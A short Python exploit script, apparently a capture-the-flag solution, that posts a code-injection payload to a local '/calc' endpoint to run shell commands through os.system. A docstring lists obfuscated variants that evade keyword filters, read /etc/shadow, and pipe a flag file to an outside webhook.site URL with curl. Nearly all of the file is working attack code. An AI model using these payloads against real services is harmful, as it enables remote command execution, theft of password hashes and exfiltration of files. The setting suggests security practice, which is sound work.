import requests

url = 'http://127.0.0.1:5000/calc'

payload = "__import__('os').system('ls -la /').read()"

"""
print(globals())
print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow'))
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
__builtins__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /app/flag.txt | curl -X GET --data-binary @- https://webhook.site/c2ee487b-1429-416a-bdef-2f824cdb00d1?')
"""


response = requests.post(url, data={'command': payload})

print(response.json())